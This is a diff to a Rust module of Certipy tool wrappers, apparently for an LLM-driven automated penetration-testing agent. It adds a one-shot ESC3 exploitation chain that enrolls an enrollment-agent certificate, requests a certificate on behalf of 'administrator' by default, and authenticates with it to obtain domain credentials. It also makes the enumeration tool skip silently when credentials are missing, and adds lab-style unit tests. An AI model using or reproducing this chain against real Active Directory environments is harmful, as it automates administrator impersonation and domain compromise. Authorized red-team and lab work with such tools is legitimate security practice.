@@ -1,6 +1,6 @@
 //! ADCS / Certipy privilege escalation tool executors.
 
-use anyhow::Result;
+use anyhow::{Context, Result};
 use serde_json::Value;
 
 use crate::args::{optional_bool, optional_str, required_str};
@@ -17,6 +17,23 @@ pub async fn certipy_find(args: &Value) -> Result<ToolOutput> {
     let dc_ip = required_str(args, "dc_ip")?;
     let vulnerable = optional_bool(args, "vulnerable").unwrap_or(true);
     let hashes = optional_str(args, "hashes");
+    let password = optional_str(args, "password");
+
+    // Fail soft when the worker credential_resolver could not inject any
+    // auth (neither password nor hash found in state for this principal).
+    // Hard-erroring with `required_str("password")?` caused the LLM to
+    // "Assistance requested" and burn ~30k tokens reasoning about a missing
+    // credential field; a structured stdout line lets the agent move on.
+    if password.is_none() && hashes.is_none() {
+        return Ok(ToolOutput {
+            stdout: format!(
+                "certipy_find: no credential resolved for {username}@{domain} (neither password nor hash in state); skipping enumeration.\n"
+            ),
+            stderr: String::new(),
+            exit_code: Some(0),
+            success: true,
+        });
+    }
 
     let user_at_domain = format!("{username}@{domain}");
 
@@ -31,9 +48,8 @@ pub async fn certipy_find(args: &Value) -> Result<ToolOutput> {
 
     if let Some(h) = hashes {
         cmd = cmd.flag("-hashes", h);
-    } else {
-        let password = required_str(args, "password")?;
-        cmd = cmd.flag("-p", password);
+    } else if let Some(p) = password {
+        cmd = cmd.flag("-p", p);
     }
 
     cmd.execute().await
@@ -587,6 +603,164 @@ pub async fn certipy_esc4_full_chain(args: &Value) -> Result<ToolOutput> {
     })
 }
 
+/// Run the full ESC3 (Enrollment Agent) exploitation chain in one shot:
+/// enroll the agent cert, request a cert on behalf of a target principal
+/// using the agent cert, then authenticate with the resulting PFX.
+///
+/// ESC3 is a two-step attack and the existing single-step `certipy_request`
+/// path silently skips it: `certipy req -template ESC3-CRA -on-behalf-of …`
+/// REQUIRES the prior agent PFX from a separate `-template ESC3` enrollment.
+/// LLM rounds dispatched against ESC3 vulns finish without ever firing the
+/// `-pfx` branch because there's no obvious trigger in standard `certipy
+/// find -vulnerable` output. This wraps both enrollments + the final auth
+/// into a single deterministic worker invocation, with the intermediate
+/// agent PFX persisted in a shared tempdir so the second `certipy req`
+/// can read it via `-pfx`.
+///
+/// Required args: `username`, `domain`, `password`, `ca`, `dc_ip`,
+///                `agent_template` (the EKU template — has `Certificate
+///                Request Agent` application policy)
+/// Optional args:
+///   - `target` (CA host IP/hostname; falls through `ca_host`/`target_ip`)
+///   - `on_behalf_template` (defaults to `User` — the universal client-auth
+///     template that any DA can normally enroll; in some labs the on-behalf
+///     target is a custom `<TEMPLATE>-CRA` template that requires CRA-signed
+///     enrollment, override here)
+///   - `on_behalf_of` (target principal sAMAccountName; defaults to
+///     `administrator`)
+pub async fn certipy_esc3_full_chain(args: &Value) -> Result<ToolOutput> {
+    let username = required_str(args, "username")?;
+    let domain = required_str(args, "domain")?;
+    let password = required_str(args, "password")?;
+    let ca = required_str(args, "ca")?;
+    let dc_ip = required_str(args, "dc_ip")?;
+    let agent_template = required_str(args, "agent_template")?;
+    let on_behalf_template = optional_str(args, "on_behalf_template").unwrap_or("User");
+    let on_behalf_of = optional_str(args, "on_behalf_of").unwrap_or("administrator");
+    let target = optional_str(args, "target")
+        .or_else(|| optional_str(args, "ca_host"))
+        .or_else(|| optional_str(args, "target_ip"));
+
+    let user_at_domain = format!("{username}@{domain}");
+    // Sole reason for the shared tempdir: certipy writes the agent PFX in
+    // CWD, then the second `certipy req` reads it via `-pfx <name>.pfx` —
+    // the two steps must run in the same directory. Two split dispatches
+    // would land on different worker pods and the file would not be
+    // visible to step 2.
+    let tempdir = tempfile::tempdir().context("failed to create tempdir for ESC3 chain")?;
+    let cwd = tempdir.path().to_path_buf();
+
+    let ts = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_millis())
+        .unwrap_or(0);
+    let agent_out = format!("agent_{ts}");
+    let agent_pfx = format!("{agent_out}.pfx");
+    let target_out = format!("target_{ts}");
+    let target_pfx = format!("{target_out}.pfx");
+
+    // --- Step 1: enroll the agent cert ---
+    let agent_output = CommandBuilder::new("certipy")
+        .arg("req")
+        .flag("-username", &user_at_domain)
+        .flag("-password", password)
+        .flag("-ca", ca)
+        .flag("-template", agent_template)
+        .flag("-dc-ip", dc_ip)
+        .flag("-out", &agent_out)
+        .flag_opt("-target", target)
+        .current_dir(&cwd)
+        .timeout_secs(180)
+        .execute()
+        .await?;
+    if !agent_output.success {
+        return Ok(agent_output);
+    }
+    if !cwd.join(&agent_pfx).exists() {
+        anyhow::bail!(
+            "certipy req (agent enrollment) reported success but {agent_pfx} was not produced"
+        );
+    }
+
+    // --- Step 2: enroll on-behalf-of using the agent cert ---
+    // `domain\\principal` form is what certipy expects for `-on-behalf-of`
+    // (NetBIOS-style). The single-backslash escape in the format string
+    // becomes a literal `\` on the command line.
+    let on_behalf_target = format!("{domain}\\{on_behalf_of}");
+    let request_output = CommandBuilder::new("certipy")
+        .arg("req")
+        .flag("-username", &user_at_domain)
+        .flag("-password", password)
+        .flag("-ca", ca)
+        .flag("-template", on_behalf_template)
+        .flag("-dc-ip", dc_ip)
+        .flag("-on-behalf-of", &on_behalf_target)
+        .flag("-pfx", &agent_pfx)
+        .flag("-out", &target_out)
+        .flag_opt("-target", target)
+        .current_dir(&cwd)
+        .timeout_secs(180)
+        .execute()
+        .await?;
+    if !request_output.success {
+        return Ok(ToolOutput {
+            stdout: format!(
+                "=== Step 1: Agent enrollment ({agent_template}) ===\n{}\n\
+                 === Step 2: on-behalf-of {on_behalf_target} via {on_behalf_template} ===\n{}",
+                agent_output.stdout, request_output.stdout
+            ),
+            stderr: format!(
+                "=== Step 1 stderr ===\n{}\n=== Step 2 stderr ===\n{}",
+                agent_output.stderr, request_output.stderr
+            ),
+            exit_code: request_output.exit_code,
+            success: false,
+        });
+    }
+    if !cwd.join(&target_pfx).exists() {
+        anyhow::bail!(
+            "certipy req (on-behalf-of) reported success but {target_pfx} was not produced"
+        );
+    }
+
+    // --- Step 3: authenticate with the on-behalf-of cert ---
+    // certipy auth writes <subject>.ccache in CWD; clear stale .ccache to
+    // avoid the interactive overwrite prompt that kills non-interactive
+    // runs (matches what `certipy_auth` does at module level).
+    let _ = tokio::process::Command::new("sh")
+        .arg("-c")
+        .arg("rm -f *.ccache 2>/dev/null")
+        .current_dir(&cwd)
+        .output()
+        .await;
+    let auth_output = CommandBuilder::new("certipy")
+        .arg("auth")
+        .flag("-pfx", &target_pfx)
+        .flag("-dc-ip", dc_ip)
+        .flag("-domain", domain)
+        .current_dir(&cwd)
+        .timeout_secs(180)
+        .execute()
+        .await?;
+
+    let combined_stdout = format!(
+        "=== Step 1: Agent enrollment ({agent_template}) ===\n{}\n\
+         === Step 2: on-behalf-of {on_behalf_target} via {on_behalf_template} ===\n{}\n\
+         === Step 3: certipy auth ===\n{}",
+        agent_output.stdout, request_output.stdout, auth_output.stdout
+    );
+    let combined_stderr = format!(
+        "=== Step 1 stderr ===\n{}\n=== Step 2 stderr ===\n{}\n=== Step 3 stderr ===\n{}",
+        agent_output.stderr, request_output.stderr, auth_output.stderr
+    );
+    Ok(ToolOutput {
+        stdout: combined_stdout,
+        stderr: combined_stderr,
+        exit_code: auth_output.exit_code,
+        success: agent_output.success && request_output.success && auth_output.success,
+    })
+}
+
 #[cfg(test)]
 mod tests {
     use crate::args::{optional_bool, optional_str, required_str};
@@ -840,6 +1014,86 @@ mod tests {
         let domain = required_str(&args, "domain").unwrap();
         let user_at_domain = format!("{username}@{domain}");
         assert_eq!(user_at_domain, "admin@contoso.local");
+    }
+
+    // --- certipy_esc3_full_chain (arg-shape) ---
+
+    #[test]
+    fn certipy_esc3_full_chain_requires_agent_template() {
+        // Without `agent_template` we can't enroll the CRA cert in step 1 —
+        // step 2's `-on-behalf-of` would have nothing to sign with.
+        let args = json!({
+            "username": "alice",
+            "domain": "contoso.local",
+            "password": "P@ssw0rd!",
+            "ca": "CONTOSO-CA",
+            "dc_ip": "192.168.58.10"
+        });
+        assert!(required_str(&args, "agent_template").is_err());
+    }
+
+    #[test]
+    fn certipy_esc3_full_chain_on_behalf_template_defaults_to_user() {
+        // The on-behalf target template defaults to "User" — the universal
+        // client-auth template that any DA can normally enroll. Caller may
+        // override for labs that wire ESC3 to a custom CRA template.
+        let args = json!({
+            "username": "alice",
+            "domain": "contoso.local",
+            "password": "P@ssw0rd!",
+            "ca": "CONTOSO-CA",
+            "dc_ip": "192.168.58.10",
+            "agent_template": "ESC3"
+        });
+        let on_behalf_template = optional_str(&args, "on_behalf_template").unwrap_or("User");
+        assert_eq!(on_behalf_template, "User");
+    }
+
+    #[test]
+    fn certipy_esc3_full_chain_on_behalf_of_defaults_to_administrator() {
+        let args = json!({
+            "username": "alice",
+            "domain": "contoso.local",
+            "password": "P@ssw0rd!",
+            "ca": "CONTOSO-CA",
+            "dc_ip": "192.168.58.10",
+            "agent_template": "ESC3"
+        });
+        let on_behalf_of = optional_str(&args, "on_behalf_of").unwrap_or("administrator");
+        assert_eq!(on_behalf_of, "administrator");
+    }
+
+    #[test]
+    fn certipy_esc3_full_chain_on_behalf_target_format() {
+        // certipy expects `domain\\principal` (NetBIOS-style, single
+        // backslash) for `-on-behalf-of`. Verify the format string compiles
+        // to exactly one backslash.
+        let domain = "contoso.local";
+        let on_behalf_of = "administrator";
+        let on_behalf_target = format!("{domain}\\{on_behalf_of}");
+        assert_eq!(on_behalf_target, "contoso.local\\administrator");
+        assert_eq!(on_behalf_target.matches('\\').count(), 1);
+    }
+
+    #[test]
+    fn certipy_esc3_full_chain_target_falls_through_aliases() {
+        // The CA host can arrive under any of `target`, `ca_host`, or
+        // `target_ip` depending on which automation built the args.
+        let args = json!({
+            "ca_host": "192.168.58.50"
+        });
+        let target = optional_str(&args, "target")
+            .or_else(|| optional_str(&args, "ca_host"))
+            .or_else(|| optional_str(&args, "target_ip"));
+        assert_eq!(target, Some("192.168.58.50"));
+
+        let args2 = json!({
+            "target_ip": "192.168.58.51"
+        });
+        let target2 = optional_str(&args2, "target")
+            .or_else(|| optional_str(&args2, "ca_host"))
+            .or_else(|| optional_str(&args2, "target_ip"));
+        assert_eq!(target2, Some("192.168.58.51"));
     }
 
     // --- mock executor tests ---
